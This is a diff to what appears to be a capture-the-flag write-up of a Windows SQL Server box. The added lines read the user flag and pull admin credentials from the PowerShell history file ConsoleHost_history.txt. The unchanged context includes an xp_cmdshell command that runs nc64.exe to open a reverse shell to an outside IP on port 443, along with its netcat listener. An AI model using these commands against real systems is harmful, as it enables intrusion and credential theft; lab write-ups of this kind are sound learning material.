@@ -41,5 +41,8 @@ RECONFIGURE;
    by that we download this file to the server  and to make this file work we will use this command 
    `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.58 443"` by this we make the file work and give it our ip and the port 
    and you should run this on your terminal `nc -lnvp 443` 
-10. boom!!! we get reverse shell to the main server
+10. boom!!! we get reverse shell to the main server, now we went to Desktop to find the user.txt flag , then go to power-shell history 
+    `cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\`
+    there we will find this file `ConsoleHost_history.txt` and that have the history of this powershell then perform this command `type ConsoleHost_history.txt` and you will get the user of the admin and the password 
+11. we try to use winPEAS but idont know anything about it so we let it for letter ctf
 
